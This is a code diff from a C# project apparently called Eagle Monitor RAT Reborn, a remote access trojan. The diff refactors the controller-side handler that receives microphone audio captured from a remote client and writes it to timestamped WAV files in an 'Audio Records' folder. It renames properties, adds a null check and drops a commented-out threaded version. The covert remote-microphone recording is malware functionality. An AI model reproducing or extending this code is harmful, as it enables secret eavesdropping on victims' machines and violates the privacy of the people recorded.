@@ -13,53 +13,31 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
     {
         public RemoteAudioCapturePacketHandler(RemoteAudioCapturePacket remoteAudioCapturePacket) : base()//, ClientHandler clientHandler)
         {
-            try
+            if (ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm != null)
             {
-
-                if (ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.hasAlreadyConnected == false)
-                {
-                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentFileName = ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientPath + "\\Audio Records\\" + Misc.Utils.DateFormater() + ".wav";
-                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentOffset = 0;
-                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.waveFileWriter = new WaveFileWriter(ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentFileName, new WaveFormat(44100, 1));
-                }
-                //currentOffset
-                ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.hasAlreadyConnected = true;
-
-                ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.bufferedWaveProvider.AddSamples(remoteAudioCapturePacket.audioCapture, 0, remoteAudioCapturePacket.bytesRecorded);
-
-                ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.waveFileWriter.Write(remoteAudioCapturePacket.audioCapture, 0, remoteAudioCapturePacket.bytesRecorded);
-
-                ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.waveFileWriter.Flush();
-
-                ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentOffset += remoteAudioCapturePacket.bytesRecorded;
-            }
-            catch { }
-            return;
-            /*new Thread(() => {
                 try
                 {
 
-                    if (ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.hasAlreadyConnected == false)
+                    if (ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.HasAlreadyConnected == false)
                     {
-                        ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentFileName = ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientPath + "\\Audio Records\\" + Misc.Utils.DateFormater() + ".wav";
-                        ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentOffset = 0;
-                        ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.waveFileWriter = new WaveFileWriter(ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentFileName, new WaveFormat(44100, 1));
+                        ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.CurrentFileName = ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientPath + "\\Audio Records\\" + Misc.Utils.DateFormater() + ".wav";
+                        ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.CurrentOffset = 0;
+                        ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.WaveFileWriter = new WaveFileWriter(ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.CurrentFileName, new WaveFormat(44100, 1));
                     }
                     //currentOffset
-                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.hasAlreadyConnected = true;
+                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.HasAlreadyConnected = true;
 
-                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.bufferedWaveProvider.AddSamples(remoteAudioCapturePacket.audioCapture, 0, remoteAudioCapturePacket.bytesRecorded);
+                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.BufferedWaveProvider.AddSamples(remoteAudioCapturePacket.audioCapture, 0, remoteAudioCapturePacket.bytesRecorded);
 
-                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.waveFileWriter.Write(remoteAudioCapturePacket.audioCapture, 0, remoteAudioCapturePacket.bytesRecorded);
+                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.WaveFileWriter.Write(remoteAudioCapturePacket.audioCapture, 0, remoteAudioCapturePacket.bytesRecorded);
 
-                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.waveFileWriter.Flush();
+                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.WaveFileWriter.Flush();
 
-                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentOffset += remoteAudioCapturePacket.bytesRecorded;
-
-                    return;
+                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.CurrentOffset += remoteAudioCapturePacket.bytesRecorded;
                 }
                 catch { }
-            }).Start();*/
+                return;
+            }
         }
     }
 }
